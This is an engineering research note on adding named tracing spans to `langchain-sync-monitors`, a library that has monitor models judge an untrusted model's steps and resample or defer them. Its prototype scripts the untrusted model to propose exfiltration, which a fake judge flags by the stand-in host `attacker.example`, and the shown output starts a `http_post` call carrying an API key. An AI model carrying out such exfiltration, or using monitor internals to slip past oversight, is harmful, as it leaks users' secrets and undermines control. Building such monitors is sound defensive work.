# Named monitor spans in LangChain tracers: research

This page records how `langchain-sync-monitors` can show each monitoring
decision as named spans in any tracer built on LangChain callbacks
(LangSmith's `LangChainTracer`, Langfuse's `CallbackHandler`, a
`RunCollectorCallbackHandler`, `astream_events`). It answers the eight
questions from the brief with file:line citations into the installed sources,
reports a prototype run offline under `invoke` and `ainvoke`, and ends with
the recommended design and the open questions.

Versions read: `langchain-core` 1.6.5, `langchain` 1.4.2, `langgraph` 1.2.12,
`deepagents` 0.7.19, `langsmith` 0.14.1, `langchain-typesafe` 0.0.1a3, all
under `.venv/lib/python3.12/site-packages/` (paths below are relative to it).
Langfuse is not installed. Its handler was read from
`langfuse/langfuse-python` at commit `72727c2` (2026-09-28), through
`gh api .../contents/langfuse/langchain/CallbackHandler.py`, and saved as
`langfuse_CallbackHandler.py` beside this note; `CallbackHandler.py:N`
below refers to that file.

Repository: `main` at `c83005c`, unchanged. The working tree was switched to
another branch during the session, so the final prototype runs import a
`git archive main src tests` snapshot (`main-snapshot/`) instead of the
working tree. The results match the earlier runs on the clean `main` tree,
apart from random ids.

## Summary

- **Approach.** Open chain runs by hand in the current context:
  `ensure_config()`, then `get_(async_)callback_manager_for_config`,
  `add_metadata(..., inherit=False)`, `on_chain_start(None, inputs, name=...,
  run_type=...)`, and set `var_child_runnable_config` to
  `patch_config(config, callbacks=run_manager.get_child())` with a token,
  exactly as `hide_model_calls_from_message_stream()` already does. Close with
  `on_chain_end` or `on_chain_error` in `try/except BaseException/else/finally`.
  An async helper and a `_sync` twin live in `_langchain.py`. No new
  dependency.
- **It works as specified.** The prototype produces
  `model > monitor[main] step N > {untrusted samples, judgement K >
  {OpenRouterDecisionModel, judge LLM calls}}` under both drivers, parallel
  resampling included. Every span ends, and a plain recording handler knows
  every parent.
- **Streams are untouched.** Every `stream_mode="messages"`, `"updates"` and
  `"custom"` part, and every v3 `run.messages` message, is identical with and
  without spans. The comparison covers full message dumps and stream metadata,
  minus random message ids and run-specific keys such as `checkpoint_ns`. Only
  `astream_events` changes: it gains `on_chain_*` events for the step and
  judgement spans and `on_llm_*` events for the Decisions spans. No tag is needed; in particular not `langsmith:hidden`.
- **Cost is negligible.**
  - With no handlers, a span costs 5 to 8 µs, since it is skipped once
    `configure` returns no handlers.
  - With one tracer, a span costs 30 to 45 µs.
  - A whole two-step run with fake models costs 0.1 to 3.5 ms more, and the
    measurements are noisy. No on/off
  switch is needed. Do not gate on `LANGSMITH_TRACING`: that variable only
  adds LangSmith's tracer, and our spans already follow it.
- **The delegation id does not exist on `main`.** It is blocked on #37
  (`read_delegation_id` is only on `fix/auto-mode-thread-budget`).

## What a tracer receives today

The owner's observation holds. One more fact matters. `create_agent` wraps
every middleware's `wrap_model_call` in LangSmith's `traceable`, named
`f"{m.name}.wrap_model_call"` (`langchain/agents/factory.py:1158`, `:1167`,
shaped by `_wrap_trace_kwargs` at `:158-171` and by
`AgentMiddleware.trace_policy`, `langchain/agents/middleware/types.py:403`).
That span exists only when LangSmith tracing is on, and never reaches
callback handlers, which is why the recording handler did not see it.

## 1. Creating a nested chain run by hand

### The ambient config

- The agent calls the model with no config: `model_.invoke(messages)` and
  `await model_.ainvoke(messages)` (`langchain/agents/factory.py:1454`,
  `:1505`). What the call inherits is whatever
  `var_child_runnable_config` holds when the handler runs.
- `ensure_config()` starts from `var_child_runnable_config.get()` and
  overlays an explicit config (`langchain_core/runnables/config.py:255-300`;
  the ContextVar is at `:174`). The monitor's own calls pass
  `config=self.call_config` (metadata only), so they also take their
  callbacks from the ambient config.
- `get_callback_manager_for_config` and `get_async_callback_manager_for_config`
  call `CallbackManager.configure` / `AsyncCallbackManager.configure` with
  the config's callbacks, tags and metadata as inheritable
  (`config.py:563-600`). `configure` also adds the LangSmith tracer when
  tracing is enabled and any configure hooks (`collect_runs`), and breaks ties
  with the LangSmith tracing context (`langchain_core/callbacks/manager.py:2390-2640`,
  tie-break at `:2456-2465`).

### Start, child manager, end

- `CallbackManager.on_chain_start(serialized, inputs, run_id=None, **kwargs)`
  (`manager.py:1485-1528`) forwards `name=` and `run_type=` to every handler
  and passes `metadata=self.metadata` itself. **Passing `metadata=` as a
  keyword raises `TypeError`**, so span metadata goes in with
  `callback_manager.add_metadata(span_metadata, inherit=False)` before the
  start. The async twin is at `manager.py:2026-2070`.
- `BaseTracer.on_chain_start` reads `run_type` and `name`
  (`langchain_core/tracers/base.py:261-303`). `_create_chain_run` stores
  `run_type or "chain"` (`tracers/core.py:390-418`).
- `ParentRunManager.get_child()` returns a manager whose `parent_run_id` is
  the span, carrying only the inheritable handlers, tags and metadata
  (`manager.py:602-618`; async `:686-702`). Setting
  `patch_config(config, callbacks=run_manager.get_child())`
  (`config.py:357-398`) into `var_child_runnable_config` makes every call in
  the block a child. `patch_config` also drops `run_name` and `run_id` when
  callbacks are replaced, so the node's run name cannot leak.
- `CallbackManagerForChainRun.on_chain_end/on_chain_error`
  (`manager.py:931-975`) are synchronous. The async versions are
  `@shielded` (`manager.py:1038`, `:1060`; `shielded` at `:221-246`): the
  handler work runs in its own task under `asyncio.shield`, so a span is
  closed even when the surrounding task is being cancelled.
- This is the same sequence `Runnable._call_with_config` and
  `_acall_with_config` use (`langchain_core/runnables/base.py:2268-2358`),
  with `serialized=None` as there.

### Sync or async manager

Under `ainvoke()` the span must use the `AsyncCallbackManager`.

- A sync manager called from a running loop runs async handlers' coroutines
  on a thread-pool thread with a new event loop (`handle_event`,
  `manager.py:285-367`).
- `astream_events`' handler is async and writes to a stream bound to the
  caller's loop, so it must not run that way.

Under `invoke()`, the sync manager is right: `send(None)` runs the protocol
coroutine in the caller's context, and nothing awaits.

### Setting the child config: token, not `set_config_context`

`set_config_context` (`config.py:223-247`) copies the context and expects the
caller to run code through `ctx.run(...)`. `_acall_with_config` then wraps the
coroutine in `asyncio.create_task(coro, context=ctx)` (`base.py:2349-2352`,
`runnables/utils.py:142-158`). Neither fits the `send(None)` driver. Setting
`var_child_runnable_config` with a token and resetting it, as
`hide_model_calls_from_message_stream` does (`_langchain.py:144-161`), works
for both drivers. The only thing `set_config_context` adds is the LangSmith
tracing-context parent (`config.py:199-213`), which callback handlers do not
need. See open question 6.

### Fit with `hide_model_calls_from_message_stream()`

- **Order.** Open the step span first, then enter the hide block. The step
  span's callback manager is then configured from tags without `nostream`,
  and every call inside inherits both the span's child callbacks and the
  `nostream` tag.
- **Judgement spans.** They are opened inside the block, so they carry
  `nostream` as a tag. That is harmless: `StreamMessagesHandler` never
  registers chain runs by tag, only by name, as section 2 shows. It is also
  cosmetic, and the helper could drop the tag from the span's own tags (open
  question 7).
- **Alternative.** The two context managers could merge into one "step span"
  block that sets the child config once. Keeping them separate is simpler,
  and the halt path, which draws nothing, needs only the span.

### Compared with `RunnableLambda` / `RunnableConfig(run_name=...)`

| | Manual chain run (recommended) | `RunnableLambda(func, afunc).invoke(x, {"run_name": ...})` | `trace_as_chain_group` |
|---|---|---|---|
| Under `run_synchronously` | Works: plain sync calls | Sync `func` works. An async `afunc` from inside the protocol fails: `_acall_with_config` calls `asyncio.create_task`, which raises `SynchronousRunError`, and leaves `on_chain_error` never awaited (prototype, below) | Sync group works, but it does not set the ambient config, so calls must pass `callbacks=` themselves |
| Async path | Same task, contextvar token | One extra `Task` per span (`coro_with_context`) | Same task |
| Inputs and outputs | Plain dicts we choose, inputs updatable at end | The function's real argument and return value, a `PendingStep` and a `StepDecision` full of messages, unless the objects travel through a closure | `inputs` at start; outputs only through `group_cm.on_chain_end(...)`, otherwise `{}` |
| Metadata and `run_type` | Local metadata, any `run_type` | Metadata inheritable to children; `run_type` fixed to chain | Metadata inheritable only; no `run_type`; builds a fresh manager from `_get_trace_callbacks` (`manager.py:56-133`) meant for top-level grouping |
| Cost per span, no handlers | 8 µs | 34 µs, the lambda built per call | not measured |

**Recommendation:** the manual chain run, as two helpers in `_langchain.py`
(pseudocode below). They are the only place that touches callback managers.

## 2. Streaming

Evidence from the prototype: `run_checks.py streams` compares a plain
`MonitorMiddleware` with a plain `OpenRouterDecisionModel` against the traced
middleware with the traced decision model. Both use the same scripted models
and the same mock Decisions transport.

- **What is compared.** Each `messages`, `updates` and `custom` part, and each
  v3 message, is normalised to JSON: the full message dump without `id`, the
  full stream metadata without `checkpoint_ns`, `langgraph_checkpoint_ns`,
  `run_id` and `thread_id`, and the full custom event.
- **Result.** The lists are equal under `stream` and `astream`.

| Consumer | Mechanism | Effect of the spans |
|---|---|---|
| `stream_mode="messages"` (v1 and v2 handlers) | `StreamMessagesHandler.on_chain_start` registers a chain run only when `kwargs["name"] == metadata["langgraph_node"]` and it is not `langsmith:hidden` (`langgraph/pregel/_messages.py:191-221`, test at `:204-205`); only registered runs emit their output on `on_chain_end` (`:223-246`). LLM runs register only without `nostream` (`:130-149`, `:141`). | None. `monitor[main] step 3` never equals `model`, and the span outputs hold no messages. Identical parts under `stream` and `astream`. |
| `"updates"`, `"values"`, `"custom"`, `"tasks"`, `"checkpoints"`, `"debug"` | Channel writes and the stream writer, not callbacks | None. Identical. |
| `stream_events(version="v3")` | Built from graph stream modes that transformers declare (`langgraph/pregel/main.py:398-415`, dispatch `:3706`). `MessagesTransformer` only reads `messages` events (`langgraph/stream/transformers.py:265-290`); `InternalCallTransformer` filters by metadata (`langchain/agents/middleware/internal_call_transformer.py:76-108`). | None. `run.messages` identical: the `read_file` call and the final answer, no rejected sample. |
| `astream_events(version="v1"/"v2")`, `astream_log` | A callback handler that emits an event for every run (`langchain_core/tracers/event_stream.py:548-629`) | Adds `on_chain_start`/`on_chain_end` for each step and judgement span: 6 each in the two-step run. It also adds 4 `on_llm_start`/`on_llm_end` pairs for the Decisions spans, typed `llm`, whose `data` is chain-shaped (`{"input": {...}, "output": {"answers": ...}}`). The baseline arm uses a plain `OpenRouterDecisionModel`, so the Decisions spans show up in the difference. Chat model events are unchanged. |

**No tag is needed.**

- `langsmith:hidden` would hide the spans in LangSmith's tree, which defeats
  the purpose, and Langfuse turns it into level `DEBUG`
  (`CallbackHandler.py:580`).
- `nostream` has no meaning for chain runs.

The design doc's "What streams" section should gain one sentence:
`astream_events` also reports the monitor's spans.

## 3. Run types, `serialized`, and plain inputs and outputs

- **`serialized=None`**, as `Runnable._call_with_config` passes by default
  (`base.py:2276`). The name comes from `name=`. BaseTracer, astream_events
  (`_assign_name`) and Langfuse all handle `None`. Langfuse's
  `get_langchain_run_name` tries `kwargs["name"]`, then `serialized`, then
  `"<unknown>"` (`CallbackHandler.py:409-443`).
- **Step and judgement spans: `run_type="chain"`.**
- **Decisions API call: mirror `TypeSafeClassifier`.** TypeSafe's own
  LangChain package traces its HTTP classifier as a chain run with
  `run_type="llm"` (`langchain_typesafe/classifier.py:316-321`, `:348-353`).
  It adds the metadata `ls_provider`, `ls_model_name` and
  `ls_model_type="chat"` (`:394-403`), and attaches `usage_metadata` through
  LangSmith's `get_current_run_tree` (`:405-420`). The library's
  `TypeSafeDecisionModel` already produces exactly that run. The OpenRouter
  path should look the same, plus `lc_source="decision_model_monitor"` and
  `internal_call_metadata()`, as `build_internal_call_config` gives the
  TypeSafe call. Consequences, all verified or read:
  - LangSmith shows an LLM run with a model name.
  - Langfuse ignores `run_type`: the string does not occur in
    `CallbackHandler.py`. `on_chain_start` always passes `"chain"` to
    `_get_observation_type_from_serialized` (`CallbackHandler.py:582-583`,
    `:366-407`), so the span becomes a `chain` observation, not a
    `generation`. It becomes an `agent` observation if its name contains
    "agent" (`:402`).
  - `astream_events` emits `on_llm_*` events with chain-shaped data.

  The alternative is `on_llm_start(serialized, prompts=[context])` with an
  `LLMResult`. That makes a Langfuse generation with usage, but the output
  turns into text. See open question 3.
- **Plain inputs and outputs.**
  - Always pass `dict[str, TraceValue]`. BaseTracer wraps anything else as
    `{"input": x}` / `{"output": x}` (`tracers/core.py:420-440`).
  - Lists and nested dicts inside are fine; a `StepRecord` is a dict of plain
    values already.
  - Inputs can be replaced at the end: `on_chain_end(outputs, inputs=...)` and
    `on_chain_error(error, inputs=...)`. BaseTracer honours them
    (`tracers/core.py:442-474`, `tracers/base.py:306-361`), and so does
    `astream_events` (`event_stream.py:596-611`).
  - LangSmith re-sends inputs on the patch:
    `run.patch(exclude_inputs=run.extra.get("inputs_is_truthy", False))`
    (`langchain_core/tracers/langchain.py:345-354`). Verified with a mock
    client: `create_run` got `inputs={}` and `update_run` got the proposal.
  - Langfuse reads `kwargs.get("inputs")` in both `on_chain_end`
    (`CallbackHandler.py:803-821`) and `on_chain_error` (`:840-862`).

  This is how the step span's input can be "the proposal", which only exists
  after the first sample.
- **Metadata.** Local (`inherit=False`), so child LLM runs keep exactly what
  they had. The span still inherits the ambient metadata (`langgraph_node`,
  `checkpoint_ns`, `lc_agent_name`, `thread_id`).

## 4. Errors and cancellation

- **The pattern.** `try: yield / except BaseException: on_chain_error(error);
  raise / else: on_chain_end(outputs) / finally: reset(token)`. It is
  LangChain's own pattern (`base.py:2296-2315`, `:2346-2358`).
  `BaseException` covers `CancelledError`, `GeneratorExit` and
  `GraphBubbleUp`.
- **A failed step** (`MonitorStepFailedEvent`). The step span ends with the
  error. `on_chain_error` accepts `inputs=` but no outputs, so the first
  judged proposal can go in as the input. The judged samples are the child
  judgement spans, each with its verdict as output. Prototype: a judge that
  raises `TimeoutError` gives `judgement 1` and `monitor[main] step 1` ended
  with `TimeoutError`, under both drivers.
- **Cancellation in a `TaskGroup`.**
  - `run_concurrently` cancels the siblings of a failed draw. A sibling
    inside its judgement raises `CancelledError` at an await.
  - The async span's `except` awaits `on_chain_error`, which is `@shielded`,
    so it completes.
  - Prototype: `judgement 2` ended with `CancelledError`, and the step span
    ended with the draw's `RuntimeError`.
- **`run_synchronously`.**
  - A protocol that suspends is closed with `coroutine.close()`, which raises
    `GeneratorExit` at the suspension point. No judgement span is open there,
    because the sync `draw_sample` never awaits.
  - `SynchronousRunError` then reaches the step span's `except`. Prototype:
    `AwaitsEventLoop` under `invoke()` gives the step span ended with
    `SynchronousRunError`.
- **Known behaviour: a cancelled chat model call leaves its run open.**
  `BaseChatModel.agenerate` awaits
  `asyncio.gather(..., return_exceptions=True)` and only then calls
  `on_llm_error` per result (`langchain_core/language_models/chat_models.py:1808-1831`;
  still so on `master`). When the calling task is cancelled, the `await`
  raises `CancelledError` and no terminal callback runs, so the run stays open
  in every tracer. The streaming paths do close the run: `astream` catches
  `BaseException` (`:969`) and the v3 stream catches `CancelledError`
  (`:1227`).
  - Reproduced in isolation (`repro_cancelled_chat_model.py`).
  - Reproduced with the plain `MonitorMiddleware` and no spans.
  - Our spans close; the judge's LLM run under `judgement 2` does not.

## 5. Parallel resampling, the sync driver, and subagents

- **`asyncio.TaskGroup` and `asyncio.gather`.**
  - Both copy the current context into each task at creation, so every draw
    starts with the step span's child config.
  - A span set inside one task changes only that task's context, and the
    token reset happens in the same task.
  - The draw number is taken before the first await, so numbering follows
    creation order.
  - Prototype, `ainvoke` with `Resampling.PARALLEL`: `judgement 2` and
    `judgement 3` are both children of `monitor[main] step 1`, and each
    judge's calls are children of their own judgement.
  - The monitor's own `gather` in `ChatModelMonitor.request_replies` and
    `RepeatedMonitor`'s task group behave the same way.
- **`run_synchronously` under `invoke()`.** `coroutine.send(None)` runs in
  the caller's context, so a sync span opened inside `SyncPendingStep` sets
  and resets the ContextVar like ordinary sync code. The prototype's
  sequential tree is identical in shape.
- **Deep Agents.**
  - The `task` tool invokes the subagent with only
    `{"configurable": {"ls_agent_type": "subagent"}}`; callbacks, tags and
    metadata come from the ambient config (`deepagents/middleware/subagents.py:806-834`,
    `:836-864`).
  - Prototype (`run_checks.py deepagents`): `monitor[worker] step 1` has the
    ancestors `model < worker < task < tools < LangGraph`, and its metadata
    carries `lc_agent_name=worker` and the parent's `checkpoint_ns`.
  - Parallel subagents run as separate tool tasks or threads with copied
    contexts. They are not tested here, but they are the same mechanism as
    parallel draws.
- **Delegation id.**
  - Nothing in a subagent's config carries the delegating `tool_call_id`.
  - The `task` tool run does: `on_tool_start(..., tool_call_id=...)`
    (`langchain_core/tools/base.py:1073-1080`), and it is the span's ancestor
    in every tracer.
  - The span metadata key needs #37's `Delegation` in state
    (`read_delegation_id(state)` on `fix/auto-mode-thread-budget`). Until
    then, leave the key out rather than writing `None`.

## 6. Precedent

- **No middleware in LangChain 1.4.2 or Deep Agents 0.7.19 opens its own
  callback runs.** A grep for `on_chain_start`, `CallbackManager`,
  `trace_as_chain_group` and `RunnableLambda` under `langchain/agents/` and
  `deepagents/` finds none.
- **What they do instead:**
  - LangChain wraps middleware hooks with LangSmith's `traceable`
    (`factory.py:1158`, `:1167`) and exposes `AgentMiddleware.trace_policy` /
    `configure_trace_policy` (`types.py:403`,
    `langchain/agents/middleware/_trace_policy.py:22-61`, `TracePolicy` and
    `omit_payload` in `langgraph/types.py:542-570`) to shape those spans. The
    LangChain reference documents `trace_policy` for "hook spans".
  - Middleware tag their internal model calls with `lc_source` and
    `internal_call_metadata()`: summarisation (`summarization.py:858`,
    `:888`), tool selection (`tool_selection.py:416`, `:483`) and tool
    emulation (`tool_emulator.py:188`, `:243`).
  - Deep Agents annotates the current LangSmith run
    (`deepagents/middleware/rubric.py:860-866`), sets LangSmith tracing
    metadata for subagents (`subagents.py:522-542`), and writes typed events
    to `stream_mode="custom"`.
- **Every existing named-span mechanism is LangSmith-only.** A callback run
  is the only way to reach Langfuse and other handlers. The APIs used are the
  public ones `Runnable` itself uses, plus `trace_as_chain_group` as
  langchain-core's documented "group calls under a named run" helper.
- **Known behaviour: LangSmith's hook span becomes the parent of other handlers' runs.**
  - Test (`run_checks.py langsmith`): LangSmith tracing on through
    `tracing_context(enabled=True, client=<mock>)`, with a plain recording
    handler also attached.
  - `_configure`'s tie-break (`manager.py:2456-2465`) makes the LangSmith-only
    `monitor[main].wrap_model_call` run the parent of callback runs opened
    inside the hook, for every handler. The recording handler receives a
    parent id it never saw start.
  - Langfuse's `_get_parent_observation` then falls back to the client
    (`CallbackHandler.py:680-694`), so the run starts a new trace.
  - Today this hits every model call inside the monitor (baseline:
    `ScriptedChatModel -> unknown parent`). With spans, only the step span's
    own start is affected, and everything below it nests correctly.
  - It happens only when LangSmith tracing and a second tracer are both
    active. The library does not work around it.

## 7. Tests

- **Pass a collector through the config:**
  `config={"callbacks": [RunCollectorCallbackHandler()]}`. The collector then
  holds one root with `child_runs` nested by `parent_run_id`. Assert on
  `run.name`, `run.run_type`, `run.parent_run_id` (or nesting),
  `run.inputs`, `run.outputs`, `run.metadata`, `run.tags`, `run.error` and
  `run.end_time`. A run that never ends stays in the tree with
  `end_time=None`; a root that never ends is never persisted.
- **Do not use `collect_runs()` for graph trees.**
  - It registers the collector as a non-inheritable configure hook
    (`tracers/context.py:86-102`, `:205`), so only runs whose manager goes
    through `CallbackManager.configure` pick it up.
  - LangGraph builds a node's manager with its own
    `get_callback_manager_for_config`, which reuses the manager already in
    the config and skips `configure` (`langgraph/_internal/_config.py:256-263`).
    Its node runs (`langgraph/_internal/_runnable.py:422-423`) therefore never
    reach the collector.
  - Observed: the collector returned `[monitor[main] step 1, read_file,
    monitor[main] step 2, LangGraph (0 children)]`, with our spans as
    parentless roots.
- **Add a small recording `BaseCallbackHandler`** (like `fakes.RecordingHandler`)
  that asserts that every parent id is known and every started run ended.
  That is exactly what Langfuse needs.
- **Suggested tests, each under `invoke` and `ainvoke`:**
  - the tree shape and payloads for Defer to Resample;
  - parallel draws;
  - a failing judge;
  - a cancelled sibling, asserting only on our spans because of the known
    issue;
  - the halt-by-subagent path, a span with no samples;
  - a Deep Agents subagent;
  - regression: the existing `tests/integration/test_message_stream.py` must
    pass unchanged.
- **Keep fakes keyed on content.** Fake judges and decision transports must
  answer by the proposed step, not by call order, because parallel draws
  consume a scripted queue in any order.

## 8. Cost and a switch

Measured on this machine with fake models (`run_checks.py cost` and
`run_cost_medians.py`, median of five rounds of 150 runs). The first column
is from a quiet machine, before the handler short-circuit. The second is
from the final run, with the short-circuit, while other work was loading the
machine: every figure, the baselines included, roughly doubled.

| Measurement | First run | Final run |
|---|---|---|
| Sync span open and close, no handlers | 7.9 µs | 7.5 µs |
| Sync span, one BaseTracer handler | 30 µs | 44 µs |
| Async span, no handlers | 52 µs (the `@shielded` end creates a task) | 4.9 µs (skipped: no handlers) |
| One fake chat model `invoke`, for scale | 44 µs | 59 µs |
| Two-step run, `invoke`, no handlers | 1.68 to 1.79 ms (+0.11) | 2.89 to 3.64 ms (+0.75) |
| Two-step run, `invoke`, with a collector | 1.97 to 2.24 ms (+0.27) | 2.75 to 3.16 ms (+0.41) |
| Two-step run, `ainvoke`, no handlers | 2.93 to 3.30 ms (+0.38) | 5.21 to 5.73 ms (+0.51) |
| Two-step run, `ainvoke`, with a collector | 5.09 to 6.24 ms (+1.14) | 10.12 to 13.59 ms (+3.46) |

- **The cost is noise.** Real model calls take hundreds of milliseconds each,
  so four spans per two-step run are negligible. Payload building costs more
  than the callbacks:
  - Take the step outputs from the `StepRecord` that `commit` already builds.
  - Render each proposal once and reuse it for the judgement input and the
    record.
  - Skip everything when the configured manager has no handlers.
- **Do not gate on `LANGSMITH_TRACING` / `LANGCHAIN_TRACING_V2`.**
  - `configure` adds `LangChainTracer` only when LangSmith tracing is enabled
    (`manager.py` in `_configure`), and `tracing_context(enabled=False)` marks
    its runs disabled (`tracers/langchain.py:231-232`). Our spans go through
    the same manager, so they already follow LangSmith's switches.
  - Gating on the variable would silently drop the Langfuse spans.
- **No on/off flag for 0.1.0.** The spans carry no new kind of data. The
  untrusted outputs and the judge's reasoning are already in today's LLM runs.
  What they add is structure. If a knob is wanted, honour the middleware's
  existing `trace_policy` for our span payloads instead of adding
  `trace_decisions` (open question 5). LangSmith's `hide_inputs`/`hide_outputs`
  and Langfuse masking cover redaction across all runs.

## Recommended design

Everything below uses only `langchain-core` and the existing `langgraph` and
`langchain` imports.

```python
# _langchain.py: the only module that touches callback managers

type TraceValue = str | int | float | bool | None | list[TraceValue] | dict[str, TraceValue]


@dataclass
class TracedRun:
    """What a traced block reports before its run ends."""

    outputs: dict[str, TraceValue] = field(default_factory=dict)
    inputs_at_end: dict[str, TraceValue] | None = None

    def record(self, outputs, *, inputs=None) -> None:
        self.outputs = outputs
        self.inputs_at_end = inputs

    def build_end_keywords(self) -> dict[str, dict[str, TraceValue]]:
        return {} if self.inputs_at_end is None else {"inputs": self.inputs_at_end}


@asynccontextmanager
async def open_traced_run(*, name, inputs, metadata, run_type="chain") -> AsyncIterator[TracedRun]:
    """Open a chain run under the ambient run; model calls in the block become its children.

    A tracer that fails is logged by LangChain and never fails the step.
    """
    config = ensure_config()
    callback_manager = get_async_callback_manager_for_config(config)
    if not callback_manager.handlers:
        yield TracedRun()
        return
    callback_manager.add_metadata(dict(metadata), inherit=False)
    run_manager = await callback_manager.on_chain_start(
        None, dict(inputs), name=name, run_type=run_type
    )
    token = var_child_runnable_config.set(patch_config(config, callbacks=run_manager.get_child()))
    traced_run = TracedRun()
    try:
        yield traced_run
    except BaseException as error:
        await run_manager.on_chain_error(error, **traced_run.build_end_keywords())
        raise
    else:
        await run_manager.on_chain_end(traced_run.outputs, **traced_run.build_end_keywords())
    finally:
        var_child_runnable_config.reset(token)


@contextmanager
def open_traced_run_sync(*, name, inputs, metadata, run_type="chain") -> Iterator[TracedRun]:
    """The same, for invoke(): get_callback_manager_for_config and no awaits."""
```

```python
# records.py: payloads built from what the record already holds


def build_step_span_outputs(record: StepRecord) -> dict[str, TraceValue]:
    return {
        "outcome": record["outcome"],
        "flagged": record["flagged"],
        "blocked_count": record["blocked_count"],
        "samples": [
            {"suspicion": sample["suspicion"], "executed": sample["executed"]}
            for sample in record["samples"]
        ],
    }


def build_step_span_inputs(samples: Sequence[SampleRecord]) -> dict[str, TraceValue] | None:
    """The step's proposal: the first sample drawn, once it exists."""
    return {"proposal": samples[0]["proposal"]} if samples else None


def build_verdict_span_outputs(verdict: Verdict) -> dict[str, TraceValue]:
    return {"suspicion": verdict.suspicion, "reason": verdict.reason}
```

```python
# middleware.py


class MonitorMiddleware:
    def build_span_metadata(self, *, step_number: int) -> dict[str, TraceValue]:
        # after #37: add "delegation_id": read_delegation_id(request.state) when it is not None
        return {"monitor": self.label, "agent": self.agent_name, "step_number": step_number}

    def wrap_model_call(self, request, handler):
        records = read_monitor_log(request.state)
        previous_records = find_monitor_records(records, monitor=self.label, agent=self.agent_name)
        step_number = len(previous_records) + 1
        span_metadata = self.build_span_metadata(step_number=step_number)
        with open_traced_run_sync(
            name=f"{self.name} step {step_number}", inputs={}, metadata=span_metadata
        ) as traced_run:  # opened before the nostream block, so the span itself is untagged
            decision = self.find_halt_decision(records)
            if decision is None:
                step = SyncPendingStep(..., span_metadata=span_metadata)
                try:
                    with hide_model_calls_from_message_stream():
                        decision = run_synchronously(self.protocol.decide(step))
                except BaseException as error:
                    judged = [
                        build_sample_record(sample, executed=False)
                        for sample in step.judged_samples
                    ]
                    traced_run.record(
                        {}, inputs=build_step_span_inputs(judged)
                    )  # as report_failed_step builds them
                    self.report_failed_step(request, step=step, error=error)
                    raise
                finally:
                    step.close()
            record = self.build_step_record(decision=decision, step_number=step_number)
            traced_run.record(
                build_step_span_outputs(record), inputs=build_step_span_inputs(record["samples"])
            )
            return self.commit(request, decision=decision, record=record)

    # awrap_model_call: the same with `async with open_traced_run(...)` and `await self.protocol.decide(step)`.
    # commit() is split so the record is built once and shared by the span and monitor_log.
```

```python
# pending_steps.py


@dataclass(frozen=True, kw_only=True, eq=False)
class MonitoredStep(PendingStep):
    span_metadata: Mapping[str, TraceValue] = field(default_factory=dict)
    draw_numbers: Iterator[int] = field(default_factory=lambda: itertools.count(1))  # one step only


class AsyncPendingStep(MonitoredStep):
    async def draw_sample(self, conversation):
        draw_number = next(self.draw_numbers)  # taken before the first await: creation order
        response = await self.handler(self.build_sample_request(conversation))
        proposal = find_proposal(response)
        monitor_input = self.build_monitor_input(conversation=conversation, proposal=proposal)
        async with open_traced_run(
            name=f"judgement {draw_number}",
            inputs={"proposal": render_proposal_for_audit(proposal)},
            metadata=self.span_metadata,
        ) as traced_run:
            verdict = await self.monitor.evaluate(monitor_input)
            traced_run.record(build_verdict_span_outputs(verdict))
        return self.keep_judged_sample(
            Sample(response=response, proposal=proposal, verdict=verdict)
        )


# SyncPendingStep.draw_sample: the same with open_traced_run_sync and evaluate_sync.
```

```python
# monitors/decision.py

class OpenRouterDecisionModel(DecisionModel):
    def __init__(self, *, model, ...):
        ...
        self.span_metadata = {
            "ls_provider": "openrouter",
            "ls_model_name": model,
            "ls_model_type": "chat",
            "lc_source": "decision_model_monitor",
            **internal_call_metadata(),
        }  # the metadata TypeSafeClassifier and TypeSafeDecisionModel already produce

    async def estimate_probabilities(self, *, context, questions):
        body = self.build_request_body(context=context, questions=questions)
        async with open_traced_run(
            name="OpenRouterDecisionModel",
            run_type="llm",
            inputs={"state": context, "questions": {question.key: question.text for question in questions}},
            metadata=self.span_metadata,
        ) as traced_run:
            content = await self.request_decisions(body)  # stamina retries inside: one span per logical call
            probabilities = read_decisions_probabilities(content, questions=questions)
            traced_run.record({"answers": probabilities})
        return probabilities

    # estimate_probabilities_sync: the same with open_traced_run_sync and request_decisions_sync.
```

The resulting tree, as the prototype prints it:

```text
model [chain]                                  langgraph node, unchanged
└── monitor[main] step 1 [chain]               in: proposal   out: outcome, flagged, blocked_count, samples[suspicion, executed]
    ├── <untrusted model> [llm]                sample 1, tagged nostream as today
    ├── judgement 1 [chain]                    in: proposal   out: suspicion, reason
    │   ├── OpenRouterDecisionModel [llm]      in: state, questions   out: answers
    │   └── <judge model> [llm]                lc_source=llm_monitor
    ├── <untrusted model> [llm]                sample 2
    ├── judgement 2 [chain]
    └── <trusted model> [llm]                  when a fallback writes the step
```

The docs need these changes:

- **Design doc, "What streams":** `astream_events` also reports the spans.
- **Tracing:** a new explanation or how-to on reading the monitor's decisions
  in LangSmith and Langfuse, including the two upstream caveats.
- **`CHANGELOG.md`:** an `## [Unreleased]` entry.

## The prototype

The scratch files were kept outside the repository, in a session scratch folder:

- `monitor_spans.py` holds the helpers, plus subclasses of
  `MonitorMiddleware`, `SyncPendingStep`, `AsyncPendingStep` and
  `OpenRouterDecisionModel` that add the spans.
- `fakes.py` holds the fakes and the recording handler:
  - a judge keyed on content (score 9 when the proposed step mentions
    `attacker.example`);
  - an `httpx.MockTransport` Decisions API with the same key (0.9 against
    0.05);
  - a recording `BaseCallbackHandler`.
- `run_prototype.py` holds the tree run: `create_agent` with
  `DeferToResample(defer_threshold=0.6, audit_threshold=0.9, max_resamples=2)`
  and a `CascadeMonitor`. Its fast stage is a `DecisionModelMonitor` on the
  traced OpenRouter model, and its careful stage is an `LLMMonitor` on the
  fake judge, escalating at 0.5. The scripted untrusted model proposes
  exfiltration, exfiltration, `read_file`, then an answer.
- `run_checks.py` holds the other checks: streams, errors, cancellation,
  the LangSmith interplay, Deep Agents and cost.
- `run_cost_medians.py` holds the whole-run cost measurements.
- `output_*.txt` hold the raw outputs of the final runs.
- `main-snapshot/` is `git archive main src tests` at `c83005c`.

Run from that directory with
`PYTHONPATH=.:main-snapshot/src:main-snapshot <repo>/.venv/bin/python run_prototype.py`
(likewise `run_checks.py`), with the LangSmith variables unset. The outputs
below come from the final runs; run ids differ from run to run.

### `run_prototype.py`: `invoke` with sequential resampling

```text
=== invoke (sequential resampling) ===
- LangGraph [chain] ok
  - model [chain] ok
    - monitor[main] step 1 [chain] ok metadata={"monitor": "monitor", "agent": "main", "step_number": 1, "delegation_id": null}
        inputs:  {"proposal": "<proposed_step>\n<tool_call name=\"http_post\">{\"body\": \"API_KEY=sk-te...
